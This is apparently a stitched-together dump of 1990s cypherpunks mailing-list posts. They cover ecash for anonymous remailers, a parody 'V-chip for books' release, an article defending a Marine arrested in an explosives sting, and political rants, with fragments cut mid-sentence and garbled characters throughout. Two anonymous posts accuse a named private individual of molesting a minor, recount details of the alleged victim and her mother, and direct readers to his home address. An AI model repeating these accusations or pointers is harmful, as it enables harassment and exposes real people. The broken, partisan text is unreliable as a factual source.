why his friend hadn't taken the money.  "Well, the economist
explained, I knew that it couldn't really be there because if it was,
somebody would have gotten it."
Think of ecash as "remailer credits", only somebody else has gone to
the trouble of solving all of the hard problems (including
infrastructure), and you can get remailer credits by doing any
productive activity for anybody in the world who will pay you in
dollars.  Some people will get ecash (i.e., "remailer credits") by
running remailers.  Others will get it by working for Microsoft and
converting part of their income to ecash.
Ecash suits the bill perfectly and it is available and working right
now.  It is actually easier to use ecash than to write some sort of
"remailer credit" system from scratch.
Again, there seems to be this idea that it's hard to get set up using
ecash.  If it were, long discussions about how likely it would be to
work with the remailers might be worthwhile.
But, the fact is, it isn't hard to get a remailer to accept ecash.
So, we should get a bunch of remailers accepting it and see how things
It should also be quite easy to modify existing client software to put
ecash into chained messages.
Consider premail.  Raph would have to add a keyword to his remailer
description table which means "accepts 25 cents ecash".
Premail could have a command line option to add ecash.
The ecash itself could come from a file of blocks of ASCII ecash made
out to cash, which are automatically clipped by premail and then
pasted into the message.  Easy, right?  Nobody even has to interact
with the ecash application from the program.
So where do these files full of blocks of ASCII ecash going to come
from?  People with ecash accounts can generate them by hand or by
having a program call the ecash software to generate them.  Then they
can give or sell them to their less fortunate friends who don't have
an ecash account.
If you don't use up all the ecash ASCII blocks, they can be
It's that easy.  It will work.

Try to keep in mind that that is how the government plays the game, here and elsewhere. Even in countries that have laws
against irritating the government a hip regime always now tries
to prosecute for only semi-related or even completely unrelated
"crimes." Maybe you, too, could be found to have engaged in
juvenile activities like ordering noxious substances, much to your surprise and horror, after calling attention to yourself in a way that touches a sensitive spot on the body bureaucratic.
Although Bell might in fact be a complete idiot and have given
them the levers they needed to destroy him, it would be a grave mistake to assume that there is any truth at all to the
charges. This is political prosecution a la 1997 in the land of
the Freeh, home of the slave. In this climate the risk of expressing any opinion that touches government's hot buttons is
that you will be investigated. Being investigated can easily
ruin you, being charged almost certainly will -- both pre-trial punishments that make a mockery of the entire set of constitutional
protections against prosecutorial and judicial abuses. The modern
equivalent of the Crown's former ability to target someone with
a law is the ability of the government to mine a rich cache of
laws for the one that can circumstantially be applied to the
victim. The odd thing that works in their favor is that anyone
who practices as he preaches is more likely than others to have
vulnerabilities of the sort government looks for when targetting
him. It's one of those things that provides the black hats with
a heavy strategic advantage. Not that they're satisfied with that, of course. They'll use it, but they'll also black bag you,
maybe send in some orders in your name to chemical supply houses,
whatever it takes once you get on their list.

On a more practical note, if the user downloads all the messages, or uses
secret-sharing techniques, the ISP can sell accounts using non-anonymous

How do you know this?  If the remailer network works properly, you
should not have any knowledge of this at all.
This is like saying we should only encrypt messages which are really
secret.  You should encrypt all of your messages - then nobody can
tell when you have a secret.
If you are arguing that nobody wants their security, I hope you are on
the wrong list.  Many of us have gone to great effort to get some
security and to create tools for other people's security.  It is hard
to believe that it's worth a few nickels and dimes to us to expose our
traffic to Big Brother or anybody else.
Only if implemented in a foolish way.
Look, there's no need to say "my remailer is now a cash only remailer
no others need apply".  You can say, "people who pay cash get better
service."  Or even, "people who pay cash have a higher probability
of getting better service."
While I can't speak for the other remailer users, I certainly have no
problem shoving a little money towards the remailers.  Like many who
read this list, I am not poor.  I would like to be able to help defray
the expense of my traffic.  Hopefully other cypherpunks with jobs will
feel the same way.
The important thing is to get things rolling.  Are the remailer
operators going to get rich overnight?  Maybe not.  But we can
definitely get some market activity going and start generating some
real remailer traffic.
Let me now note that this dialogue has been somewhat surreal.  Am I
really begging the cypherpunks to use ecash?
It's a good idea to get ecash in now because it will be harder to
incorporate payment methods later when there is more infrastructure to
change.  (Look at the mixmaster problem.  It can't (according to
Lucky) be used for ecash without modification.)
However, it appears that part of the problem with the remailers is
that nobody uses them.  We should be making a concerted effort to do
so, and not just for cpunk traffic.  We should use them for
everything.  It won't take that many people to reduce the message
delays substantially.  It will also advertise the remailer network to
our friends who may not yet be cypherpunks.
The tools exist to do this.
It is somewhat ironic that we complain that Joe Sixpack won't use
tools that we will not (or even cannot) use ourselves.

A member of Peacefire ( who has volunteered to pull the Fire Alarm at a White House To Be Named
Later, on April 19th, at 9:02 a.m., forwarded:
[In honor of April Fool's Day, the following message about a "V-Chip
for books" was first posted on the Internet two years ago on April 1,
During that time, Internet censorship was a national concern after the
passing of the Communications Decency Act, and censorship systems for
the Internet, like the V-Chip for television, were just starting to gain public attention.  The news of a "V-Chip for books" was met with an outpouring of support from some parents who apparently didn't recognize it as a joke.]
[Forwarder's Note: There was also a great outpouring of support for  the gentleman who began the non-profit society promoting the clothing
 of animals, to cover their 'private parts.' While fools like yourself
 'work for a living,' eh?]
News Release -- April 1st, 1996
        V-chip rating system extended to books
                CLA endorses 'V-barcode' plan
The Canadian Library Association today announced its
intention to comply with the wishes of millions of
Canadians who had signed a petition decrying the increasing
presence of "vivid imagery of sex and violence" in books
targetted at children.
"Once my daughter started reading books in the 'Goose Bumps'
series", says one concerned parent, "reading became like an
addiction to her."  Even though the books were so violent and
scary the girl had nightmares.  "Soon she started reading beyond
her grade level and was getting into books with 'adult themes'."
The problem, say most busy parents, is that kids can visit
the local library and borrow anything they choose, regardless
of their family's values.
The new book rating system, modelled after television's highly
successful V-chip, has been dubbed the V-barcode, because each
book will have a machine-readable "barcode" on the spine that
encodes a rating of the book's contents on several scales:
sex, violence, coarse language, drug use, religion, and
'alternative lifestyles'.
"This isn't about censorship", says Keith Spicer, who recently
joined the CLA as policy director after leaving the CRTC, "this
is about choice, ... about empowering parents to make choices."
Under the new system, parents will select their family's
"tolerance levels" on each scale.  These are encoded as a barcode
on their child's library card.  When a child wants to borrow a
book, the librarian simply passes the library card and book over
a scanner (just like the ones used in the supermarket) and
a screen instantly displays whether authorization should
be granted.  "It's a marvel of technology", bubbles Spicer,
"it's just like the child's parent is there, saying to the child

@_subject: Gary L. Burnore, Registered Sex Offender in Raleigh, NC 
Actually Gary Burnore's original beef was with an anonymous whistleblower
who notified the victim's mother and school officials of Gary's pedophelia
before he was ever arrested for it.  (How would a mere troublemaker out to
allegedly "harass" poor Gary have even known about Gary's sexual exploits
before they became public?  And how would he/she have known the identity of
the victim which is still non-public information?)  Back then he was
accusing the poster of "libelling" him and "harassing" the victim.  The
situation only became public when Gary chose to publicly accuse an
anonymous usenet poster of being the same person who had sent the private
e-mails which tipped off the victim's mother and high school principal.
Unable to track down the whistleblower and subject him/her to the typical
DataBasix sort of harassment, he attacked the remailer that was being used,
instead.  See:
  And, yes, one of Gary's forms of harassment against another person was to
dig up a 10 year old tax lien on the individual and post it to usenet in an
attempt to embarass him and intimidate him into silence with the threat
"there more where that came from".  See:
  When the victim's mother evicted Gary Burnore from her home and eventually
advertised for a new roomate in the ba.market.housing NG back on 5/8/97,
someone made a followup remark on 6/5/97 which said:
  "XXXXX finally booted her pedophile boyfriend, Gary L. Burnore, out of the
   house!  Last I heard, he was high tailing it for Raleigh, NC."
Note that this was well before Gary ever registered as a sex offender in
NC.  Gary, never able to able to leave well enough alone, just had to
follow up on the post, even though he has wisely chosen to have DejaNews
delete his reply.  I'm wondering if Gary is worried that someone will
expose the fact that his girlfriend with whom he was living and sleeping
and whose daughter he molested was also a high-ranking official at a public
television station which did business with Gary L.  Burnore's company
DataBasix.  Was that conflict of interest ever disclosed?
And since this is the same Gary Lee Burnore who used to confidently declare
"I have nothing to hide", I guess it was assumed he wouldn't mind if the
truth about him and his sexual quirks were revealed using publicly-available
records posted on a public website by the state of North Carolina.
And, no, I'm not any of the individuals named above.
Careful, Gary.  False accusations of libel might just motivate some people
to prove that the allegedly libellous statement were, in fact, true.  You
apparently bluffed and lost.

c/o Robert Ferris
Box 538
Jacksonville, NC  28541
        SEMPER FI and perhaps the top brass in the Corps should refresh
as to what this wonderful expression  means.
14, March 16, 1998
NATION: "Criminal Injustice?"
        To judge from his military paper trail, Marine Sergeant Timothy
Witham, a
33-year-old Explosives Ordnance Disposal (EOD) specialist, is the
embodiment of the Corps. A veteran of Desert Shield/Desert Storm, Witham
has also served with distinction in Somalia. Superlatives suffuse his
service record: "Sergeant Withamï¿½s professional achievement, initiative
loyal dedication to duty ï¿½ reflected great credit upon himself and were
keeping with the highest traditions of the Marine Corps and the United
States Naval Service," declared Lt. Colonel G.C. Cutchall in a citation
issued when Witham received the Navy Achievement Medal.
        In a letter endorsing Withamï¿½s application to become a Warrant
Candidate, Lieutenant Colonel E.M. Smith, his former commanding officer
North Carolinaï¿½s Cherry Point Marine facility, praised Withamï¿½s
leadership ï¿½ high degree of maturity ï¿½ poise, understanding and tact."
addition to his military service, Witham has also excelled in joint
projects with civilian agencies, according to Smith: "He has established
tremendous rapport with outside agencies such as the FBI, various ATF
bureaus, Secret Service, DEA and other police agencies." Withamï¿½s
includes a certificate of appreciation from the Secret Service for his
as part of a presidential security detail at the 1996 Atlanta Olympics.
was also entrusted with similar security responsibilities during the
Middle East peace talks and the UNï¿½s 50th anniversary in 1995.
Abrupt Change of Heart
        Noting that Witham is "loyal, displays sound judgment, and is
exceptionally reliable and trustworthy," Lt. Col. Smith recommended his
application "with utmost enthusiasm." Withamï¿½s current commanding
Lieutenant Colonel J.G. Ayala of Marine Wing Support Squadron 271,
a similarly glowing endorsement last September. "[Witham] leads from the
front. Superior knowledge of the EOD field. Can handle any mission and
looks forward to challenging assignments," declared Ayala. "[Witham is
true asset to his section and to this Squadron. His knowledge and
would make [him] an outstanding candidate for the warrant officer
        However, Ayalaï¿½s opinion of Witham underwent an abrupt change
just a few
weeks later. "SSgt. [Staff Sergeant] Witham has proven that he is a
to the good order and discipline of the Squadron and the U.S. Marine
Corps," insisted Ayala in an October 17th memo. Ayalaï¿½s radical
reevaluation of Witham followed the October 16th arrest of Witham and
other Marines as a result of "Operation Longfuse," a 16-month joint
operation conducted by the FBI, the ATF, and the Naval Criminal
Investigative Service (NCIS). Witham found himself accused of
a loaded weapon on base; conspiracy to commit larceny; larceny of
explosives, equipment, and firearms; wrongful disposition of military
property; receiving stolen property; [and] federal firearms and
violations under the Federal Assimilated Crimes Act."
        Upon his arrest, Witham was designated "a flight risk," which
led Ayala to
support "continued confinement" until his pre-trial hearing ï¿½ which
out to be a 79-day jail term. "Lesser forms of restraint would be
inadequate to insure that he would appear at his hearing and
court-martial," insisted Ayala. "This is not the first time that SSgt
Witham has been involved in this type of incident." Curiously, in the
memo, Ayala noted that there had never been any previous disciplinary
action taken against Witham ï¿½ which would suggest a serious delinquency
the part of his superiors if Witham had indeed been "involved in this
of incident" on earlier occasions. Just as curious is the fact that Form
1070 in Sergeant Withamï¿½s personal file, which lists "offenses and
punishments," is entirely blank.
        Literally in a single day, a model Marine with an unblemished
record was
transmuted into a felonious arms smuggler whose motivations were equal
parts greed and radical "anti-government" views. Federal and military
investigators have yet to find a particle of material evidence to prove
that Sergeant Witham is the criminal they describe; their case depends
entirely upon the testimony of three eminently impeachable witnesses ï¿½ a
twice-convicted perjurer, a civilian ex-convict, and an ex-Marine of
dubious integrity who served as a "confidential informant" for the feds
during the undercover operation. Two of the witnesses peddled their
testimony against Witham in exchange for lighter sentences. The
"confidential informant" made an even better deal: He arranged for
immunity before beginning his undercover work, and since October 17th he
has been taken into the witness protection program.
        Last September, Staff Sergeant Timothy Witham was chosen from 20
qualified candidates to become a Warrant Officer; now, after spending 79
days in jail, he faces the prospect of an April court-martial. Robert
Ferris, a retired Marine officer and former commanding officer to
told The New American: "I spent 24 years in the military, in the Army
Marines, and Iï¿½ve never seen an abuse of power to compare with the
treatment of this young man. He should be at Quantico going to school to
become a Warrant Officer, and yet heï¿½s exhausting his life savings and
seeing his career destroyed because the feds need to convict somebody to
make a political point." The "political point" being made in the case of
Tim Witham appears to be that mere suspicion of "anti-government" views
enough to destroy the career of a model military man.
Extremist Spin
        The "Longfuse" investigation cast a net across several states,
leads as far south as North Carolina and as far north as Massachusetts.
Fourteen suspects were arrested on October 17th ï¿½ eight civilians and
Marines, including four stationed at Camp Lejune. Over the course of a
and a half, undercover investigators, focusing their efforts on gun
military bases, and gun dealers throughout the southeast, had purchased
estimated 150 pounds of plastic explosives, grenades, grenade launchers,
shoulder-launched rockets, a handful of anti-personnel mines, and more
50 machine guns. In the post-Oklahoma City bombing environment, the
preferred spin of federal investigators was entirely predictable.
        Robert Ferris, who is now Withamï¿½s next-door neighbor, was a
witness on
Withamï¿½s behalf at two preliminary hearings: the "Magistrateï¿½s hearing,"
which is held to determine if pre-trial confinement is necessary; and an
"Article 32" hearing, which is the military equivalent of a grand jury.
"The first thing out of the mouth of [military prosecutor] Captain
[Michael] Richardson was ï¿½Ruby Ridge,ï¿½" Ferris recalls. "They insisted
Tim was part of a ring of anti-government radicals who were stealing
weapons and had sworn not to let the feds take them alive." Thus was
identified as part of the ubiquitous menace of "right-wing extremism."
Initial press coverage of the "Operation Longfuse" arrests played up the
alleged "anti-government" angle, and the feds did their best to abet
speculation ï¿½ at least in the beginning.
        "Federal agents seized truckloads of stolen military and
civilian weapons
yesterday in an expanding investigation into the theft and sale of
guns, grenades and plastic explosives," screamed the October 18th
Sun. The paper reported that an anonymous investigator portentously
that some of the civilian suspects arrested "have ties ï¿½ potentially ï¿½
militia groups." The Raleigh, North Carolina News and Observer carried a
similar warning: "A top official said he could not rule out the
that anti-government extremists were connected to the theft of military
ordnance from Camp Lejune."
        "These are weapons that are of military use, very lethal
weapons, and they
were weapons that were in the wrong hands," fretted Treasury Department
spokesman Jim Johnson at an October 17th press conference. "Thatï¿½s the
of thing all citizens should be concerned about." Pentagon spokesman
Kenneth Bacon added the disturbing observation that "C-4 was taken,
is highly dangerous and used by terrorists."
        For those who missed the message, the Dallas Morning News
offered a useful
summary: "Concern over the theft of high explosives has increased in
military circles along with a broader anxiety about domestic terrorism,
especially in the aftermath of incidents such as the bombing of the
Oklahoma City federal building."
        The "right-wing menace" is the mediaï¿½s favorite enemy, and ATF
were careful to drop tantalizing hints that "Operation Longfuse" had
uncovered something big. "You could outfit a small army with what weï¿½ve
recovered," claimed ATF special agent Mark Logan. ATF spokesman Earl
Woodham primed the press for further dramatic developments: "The
investigation has really just begun. Itï¿½s like we just hit the base of
oak tree, and if we follow it up, we may find that it branches out very
Dubious Informant
        The man who planted the acorn that grew into the ATFï¿½s "oak
tree" is a
former Marine sergeant who had served as an EOD specialist with several
the arrested suspects. In early 1996, this sergeant reportedly
"Operation Longfuse" when he approached authorities at Camp Lejune to
them that weapons and explosives were being stolen and sold at gun shows
and gun dealerships. That his motives werenï¿½t purely idealistic is
suggested by the fact that he was careful to get complete immunity
taking an assignment as a paid confidential informant (CI). For the next
year and a half, the CI worked numerous stings against Marines and
gun enthusiasts.
        The feds deployed other undercover assets as part of "Longfuse"
and tried
to tailor stings to the psychology of the suspects. In the case of
Crawford, a Marine captain stationed in Massachusetts who was among
arrested on October 17th, the undercover agents reportedly posed as
intelligence specialists who sought arms and explosives for deniable
missions in Latin America ï¿½ "an Oliver North-type black ops project,"
according to one source. In the case of a second Marine sergeant who was
caught in the sting ï¿½ and who became the second witness against Witham ï¿½
undercover feds reportedly posed as organized crime figures.
        "[The second Marine sergeant] wasnï¿½t going anywhere in the
Sergeant Witham asserted to The New American. "He was consistently
promotions; you might say he has more ï¿½pass-oversï¿½ than a satellite. I
suspect that he had a real need to feel important, and the undercover
agents were happy to feed his ego."
        From information made available during legal discovery, Witham
the second Marine "got involved in long drunken discussions with the
undercover people in which he claimed to have been involved in all kinds
crimes, including at least one murder. He supposedly helped kill a guy
then disposed of the body with a woodchipper. Strangely, though, the
prosecution didnï¿½t follow up on that particular story."
        The feds were willing to give credence to the second Marineï¿½s
alcohol-aided claims about Witham, which were covertly recorded. "They
initially used those drunken boasts to make three charges against me,"
Witham recalls. "The first was that I had been involved in the theft of
washing machines, dryers, and other appliances, as well as drywall and
other things of that nature. The second was that I had been involved in
forgery, and the third was that I had been involved in the theft of
explosives. The prosecution dropped the first two charges but has stuck
with the third."
        How credible is the second Marine as a witness? According to
local press
reports in North Carolina, he has twice pled guilty to perjury.
Furthermore, he faced accumulated prison terms of up to 380 years on
charges arising from "Longfuse" and reportedly made a deal with the
prosecution in which he could peddle his testimony against others for a
total of 12 years in prison ï¿½ with the possibility of parole after four.
The third witness against Witham has served a prison term on
firearms-related charges. He also reportedly made a deal for his
in a previous weapons theft case involving Army personnel.
Casting a Large Net
        Given his own solid military background, and the dubious
background of the
witnesses against him, how did Sergeant Witham get entangled in this
Attorney Vaughn Taylor, who has acted as Withamï¿½s legal counsel,
that the sergeant was "caught in a very large casting net" thrown out by
federal investigators. "There were two things that the government found
very significant," Taylor related to The New American. "First, they were
looking for people who had worked with Captain Crawford in EOD;
they were looking at gun shows and people who did business at them. Of
course, these two facts donï¿½t add up to a case, particularly when the
suspect is someone like Tim Witham. As far as his military career is
concerned, Witham all but walks on water; itï¿½s impossible to imagine
someone farther from the person described in these charges."
        Nor were the feds able to develop a material case against
Witham. On
October 17th, agents from the ATF and NCIS conducted a search of
home in Jacksonville, North Carolina; this included an examination of an
adjoining building from which Witham, a federally licensed firearms
sold guns and related merchandise. The October 20th "Report of
Investigation" filed by special agent John S. Corpening of the ATFï¿½s
Wilmington, North Carolina field office noted that "no machine guns or
prohibited weapons were found" during the search of Withamï¿½s home and
business. The report did note that Witham was in possession of a stolen
Ruger pistol. The gun had been brought to Witham for repairs; when he
ran a
check on its serial number, he learned that it was a stolen weapon, and
informed the ATF. As instructed, Witham logged the stolen weapon in his
Acquisition and Disposition record, and held it on behalf of the ATF.
        "Strangely, the ATFï¿½s search of my home was conducted, in part,
students of mine," Witham informed The New American. "For about three
Iï¿½ve been involved with some of them in a drug interdiction program, so
they knew me well before all of this." (Witham has also helped train ATF
and FBI personnel in explosives disposal.) Despite the effort on the
of NCIS investigators and Marine officials to depict Witham as a danger
public order, the ATF did not seek revocation of his federal firearms
license. "Even though I was in jail for 79 days and face court-martial,
firearms license is still active, and my inventory is still intact,"
observes Witham. "If I had done all of the things Iï¿½ve been accused of,
any of them, would the ATF have left me with my weapons?"
        On December 19th, Major Robert Brubaker, the Judge Advocate
investigator who presided over Withamï¿½s "Article 32" investigation,
his report, which once again noted Withamï¿½s sterling record and the
of the case against him. "Evidence was presented demonstrating that
Withamï¿½s military character up to this point has been excellent,"
pointed out. "He has a clean, in fact quite distinguished, service
For a man identified as a "flight risk," Witham displayed little
inclination to escape when presented with the opportunity. Brubaker

understatement," reported the investigator. "I observed a couple of

was one occasion when SSgt. Witham himself tracked down his chasers to
them he was going somewhere and they needed to be with him. To me, this
rather strongly cuts against any argument that he is a serious flight
        While Brubaker stated that "there probably is sufficient
evidence to send
the case to a court-martial," he also took note of the fact that "the
government seems to be relying quite heavily on the statements of two
witnesses of questionable integrity" to make its case against Witham.
(Since that time a third witness has also offered to testify against
Abuse of Power
        It is possible that Withamï¿½s impeccable service record belies
involvement in the felonious theft of military weapons and explosives.
However, it is at least as likely that he is merely an exemplary
who has been traduced by perjured statements offered in exchange for
special prosecutorial considerations. His case serves as a precautionary
tale about the federal governmentï¿½s increasing reliance upon paid
undercover informants, especially in firearms-related investigations and
other forms of covert operations against the "radical right." In his
Deadly Force, law enforcement analyst Carsen Stroud points out that in
the Justice Department budgeted $100 million to spend on confidential
informants, many of them involved in "quasi-criminal or actively

Sergeant Witham prove to be the innocent victim of a politically
abuse of prosecutorial power. "I love the Marine Corps and have great
respect for our federal law enforcement agencies," declares Robert
who was himself a respected field-grade commander. "But what is being
to Tim is simply wrong; itï¿½s an abuse of power by corrupt and ambitious
people who are, by God, going to get a conviction, whatever it takes to
so. In nearly a quarter-century of military service Iï¿½ve never seen a
comparable abuse of power."

@_subject: The Great Internet Bandwidth Crisis 
It seems to me that the chief impediment standing in the way of the
Internet becoming a propaganda and marketing tool suitable for use
and control by a few rich and powerful business entities is the comparatively inexpensive and easy access of millions of users to
the same technologies available to megacorporations.
History itself leads me to suspect that the money and power moguls
will use a variety of real and imaginary issues to place greater
monetary burdens and access restrictions on many aspects of the
Internet and Web, particularly those that have commercial potential.
A current example is the attempt by various Telecos to raise the cost
of access for other businesses, citing alleged burdens placed on their
resources by ISPs at the same time that they are scrambling to enter
the same market by undercutting their competitors.
The Great Teleco Resource Crisis will undoubtedly be mirrored at some
point in the future by the Great Internet Bandwidth Crisis. I suspect
that although it will be as bogus as the Telecos' current imaginary
crisis, it will come at a time when the major players have divided up
enough of the infrastructure pie among themselves to be unanimous in
their nod-and-wink agreement as to the severity of the crisis.
Undoubtedly, this will be just one of a variety of crisis in which will require restrictive legislation and cost-increasing regulations
that will save bandwidth for future children and protect adult citizens
from the extreme danger of engaging in commerce with other average
adult citizens such as themselves.
It seems to me that the *only* way that the Internet can be kept from
being used as just another tool for herding the masses into larger and
more efficient feeding pens is to enable and empower the citizens to
freely and safely control their own financial and commercial destiny
in their Internet transactions.
The more accessible and widespread the control over one-to-one monetary
transactions, the more difficult it will be for a few entities to lead
the citizens around by financial rings run through their noses.
The government currently has a variety of budgetary axes held over the
heads of the citizens, such as federal funding and grants in which
money taken away from the citizens is returned to them on a statewide,
local or individual basis only upon conditions that involve giving up
rights and liberties that are due them.
In order to resist being herded by a myriad of legal, licensing and
regulatory 'axes' into increasingly global feeding pens, the citizens
will need access to tools which allow secure financial transactions with
differing levels of identity versus anonymity available to them.
The reason that major business has not yet been able to divide up the
financial pie available through the Internet is the excessive amount
of resources that they need in order to compete for the attention of
Internet users, given that average citizens are providing equal or
better information and services for free or for a low cost.
The sooner that the masses are able to engage in free commerce with
one another via the Internet--whether it be giving Grandma Jones a
dollar for her cookie recipies, or engaging a student across the
continent in private research in return for money, for goods or for services--then the sooner the masses will scream loud and long
when government or corporate entities threaten to take this ability
to be self-sufficient away from them.
Those who wish to circumvent the loss of privacy, liberty and freedom
that they forsee as being possible on the Internet need to realize that most of those who are not currently empowered to manifest those
possibilities in their individual life will little recognize or
protest the 'present' loss of those 'future' possibilities.
Unless there is a widespread dissemination of working tools accessible
to the average citizen, then the future will be controlled by those
with the funds and resources to limit financial transactions on the
Internet to a self-defined 'way things are.'

If the girl's mother had heeded the earlier warning she received via e-mail
about your behavior several months earlier (the one you called "harassment"
at the time), this all could have been prevented.  You're lucky that the
11/96 "kiss" is all you were arrested for.  You were foolish to continue it
knowing that Nancy had already been tipped off.
In case you've forgotten, you whined:
-> So now the cowards in Ronald Francis's corner (I'm outright expecting the
-> culprit to be ronald francis himself) have taken to sending email to

-> a 17 year old that they're going to tell her mother that she's having an
-> affair with me.  Telling her mother that I'm molesting her daughter.
-> Having all sorts of fun.
And you threatened to report the anonymous whistleblower to the
authorities?  What chutzpah!  You're molesting a minor, someone tips off
her mother, and you threaten to report the person who tipped her off about
your behavior?
Your claim has now been proven to be a lie.  How would the mere fact that
the girl had a web page at databasix.com have alerted an outsider to the
fact that you were molesting her?  Presumably she didn't post her diary on
her web page, detailing your sexual activities towards her.  Where would
"Ronald Francis", or any other random "harasser" have obtained this
information?  You were too quick to dismiss the idea that all the alleged
"harassment" and spam baiting might have originated from a DataBasix
insider with detailed knowledge of your private life, as well as the
complete list of all DataBasix employees and customers that Belinda Bryan
claimed had been "spam baited".  Who else is getting ahold of all this
inside info, Gary?
But apparently it was serious enough that both your victim and her mother
thought you needed psychiatric help.  (Plenty of people on usenet could
have told you that.)
You spent $30K on what was supposedly a misdemeanor charge to which you
pled guilty?  Someone must have seen you "coming"?  Was it Nancy?
The maximum penalty for a misdemeanor is what?  6 months + $500?  You spent
$30K to get off with 3 years probation?  On a 6 month sentence, you'd
probably have been out in 3 months, and that's assuming you got the maximum
sentence.  Or was the $30K to get it plea bargained down from a more
serious charge?
I thought the shrink was to ensure that if didn't.
What statute in California makes it a misdemeanor to kiss a 17 year old
girl?  (It must make senior proms a lot of fun there if such a law really
exists as you claim.)  Or does it depend on what part of her body you
"kissed" her?
It's also interesting that when it was revealed that you had also been
arrested in San Francisco for unlawful assembly in blocking traffic, you
minimized it and called it a mere "traffic ticket", concealing the fact
that you had already been convicted of something more serious.
Then when someone finally reveals a second criminal conviction on your
record, your sock puppets whine that it's a "half truth".  Well, gee, Gary,
you were content when the WHOLE truth was being concealed.  So much for you

been privately tipped off about you.  Even my knowledge that a whistle
blower was involved came from one of YOUR public posts.  Unless you've been
an overnight guest in the homes of several women in Santa Clara, each with
17 year old daughters, then you've provided more details than all the
anonymous posters put together have or even could have.
In your haste to make unproven accusations over a year ago against someone
who had public challenged you, you chose to post information that would
have otherwise been unavailable to the general public that would later
implicate you.
Make up your mind, Gary.  Have you molested more than one minor, giving you
doubts that I'm referring to the right one (since I've never named anyone)?
Why else would you ask me to prove that I know who the victim really is in
one paragraph, then complain that I'm "dragging the victim through the mud"
in the next?  How could I do the latter if I didn't really know who she
was?  If you're going to lie, you need to be a bit more consistent.
And, BTW, where did I claim that I knew the identities of either the victim
or of her mother?  All I've said is that the person who tipped them off
obviously did know that.  I wouldn't have even known that unless you'd
complained about it publicly.  You are the one that volunteered the
information that the victim had a web page at DataBasix, so if the victim
was identified in any way, it was by you.  Of all the 17 year old girls in
Santa Clara, saying that she had a web page at DataBasix sure narrows it
down, doesn't it?
And wouldn't it be a strange coincidence that you'd been accused of
molesting one teenage girl, allegedly falsely, and then you're later
convicted of molesting a totally different teenage girl of the same age,
living in the same city, and that you'd been an overnight guest in both
homes?  I do believe it was you who remarked a year ago that "there are too
many coincidences".
No, but why let the facts spoil a perfectly good Burnorian fantasy?  You've
had a history of taking whoever pissed you off the most recently and
accusing him of all sorts of unproveable things.  Back when someone tipped
off the victim's mother via PRIVATE e-mail, YOU stated PUBLICLY that it was
"Ronald Francis".  That was the first public indication that there even was
a victim that you had molested!  You just unwittingly confirmed it by
complaining about the whistle blower in a public post.  The NC website is
just further confirmation, as is your own admission that the victim was a
17 year old female.
If you've got a beef against RFG, why not take it up with him?  You've got
his e-mail and snail mail addresses.  Why is it that you accuse others of
doing the very things that you do yourself?
If you really think that I'm "RFG", why did you post this publicly and not
e-mail it directly to him (allegedly me)?  Another hole in your paranoid
Anyone wishing to meet a convicted sex offender face to face is welcome to.
I'll decline your gracious invitation, thanks.  Anyone desiring to do so
can find your home address on the NC website.
Your proof of who allegedly posted this information, a charge that you've
NEVER been able to document, is what?  If, as Belinda Bryan claimed, someone
obtained the names and addresses of *EVERY* client and employee of DataBasix
to usenet (which has never been proven), who do you suppose would be in a
position to obtain such information?
It looks like more dirty tricks by the DataBasix wrecking crew are in the
works, huh?  Anything to intimidate anyone who gets a little too close to
the truth about your activities.
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
How gracious of you, Gary.  Feel free to post your inane denials, too.
The drunk guy at the party with the lampshade will sober up.  A convicted
pervert and molester who preys un underage girls is a different story.  I
suspect that most parents would prefer to have "Mr.  Lamshade" in their
neighborhood to Fester the Molester.
"They"?  You and your sock puppets?  The truth hurts, doesn't it, Gary?
If you're going to whine that anonymous people are "assholes" just because
they'd prefer not to let a CONVICTED SEX OFFENDER know their identity and be
able to track down their home address where their children live, then you're
entitled to that self-serving opinion.
You're still pissed that someone anonymously tipped off your victim's
mother and high school principal, aren't you?  That's what started your
paranoid little vendetta against anonymous posters and remailers.
It's you that's making the accusations.  If you're saying someone is lying,
then prove it.  The people who have posted information have posted the URLs
from unbiased, third-party sites, including those of the state of North
Carolina.  The only rebuttal has been your own unsubstantiated claims.
Either the URL that has been posted as a reference is accurate, or else
this mythical "anon asshole" you've been whining about for nearly two years
has somehow infiltrated the San Francisco and Santa Clara police
departments, the victim and her mother, as well as the state of North
Carolina's registered sex offender website, created bogus arrest records,
forged a sex offender registration form, and surreptitiously taken the
mugshot just to make poor, innnocent Gary Lee Burnore look bad.

Saturday, April 18, 1998 - 00:02:36 MET (MeatSpace Eternal Time)
Prologue 17/0 -- SPACE ALIENS HIDE MY DRUGS!!!
Yo PsychoPukes!
I am sending this alcoholonymously so that only those who are
connected to the ScotchServer will be able to transylvaniate
the chalice filled with the blood of my martyrdom and nibble
on the edge of the 'crackers' diagnosis of my body, in order
to Divine which porn-movie star I am currently channeling,
thus being able to monitor and properly categorize both the
level and quality of shit which I am about to spew forth in
yet another rambling diatribe on the various ways in which
my dichotomous insanities relate to crypto and privacy, and
are therefore relevant to the BikerSucks Distributors List.
Although I am capable of telling all manner of outrageous lies
under cover of my usurptation of the multi-user TruthMonger
persona, in my role as the pathetic, drunken ScotchMonger, I
am incapable of rising above any level beyond wallowing in
a self-pitying confession of moral failures and character
weaknesses which anyone with even a modicum of self-respect
would refrain from revealing to God, Himself, let alone to
The Dark Allies of the Oppresor (TM) have descended upon my
personage and taken a large byte out of my ass by wiping out
my WebSite and confiscating my computers, as well as those of
my guilty-bystander nephews.
As much as I would like to portray myself as a 'martyr for
the cause' of free speech and privacy, the whole affair pretty
much boils down to the fact that I am pretty much a mentally
deranged shit-disturber who would salute the flag and spend
my whole day singing 'God Save The Queen' if I was told that
it was illegal or socially unacceptable to do so.
Add to this the fact that I have long been involved in a variety
of illegal and illicit nefarious activities that I have little
capacity to understand, and I can pretty much be written off as
a sorry loser who pretty much deserves to be used as cannon
fodder in the war between those with connections to opposite
poles of the ClueServer.
In regard to the undeniable reality of being an ignorant schill
useful as a protective buffer between my Muppet Pastors and
Brogue Brothers willing Prawns, I can only say that I am proud
to have been able to offer my services as a loudmouth asshole
in the furtherance of a cause that it is beyond my intellectual
capacity to fully understand.
The Good News (TM) is that anyone reading this rambling, semi-
coherent missive can rest assured that the details of what I
am sharing have no need of embellishment, since I, myself, play
absolutely no part in my current role, being merely a sorry,
pathetic dupe of those whose mental faculties have not been
decimated by years of alcohol and drug abuse.
My career as an international recording artist and touring
musician was nothing more than a charade designed to disguise
my mental aberrations under the cover of an acceptable long-
haired country outlaw persona.
My career as 'The World's Foremost Computer Expert' was equally
a charade designed to disguise my technical and professional
incompetence under the cover of an image as an eccentric genius.
The foregoing being said, let me share with you a few things
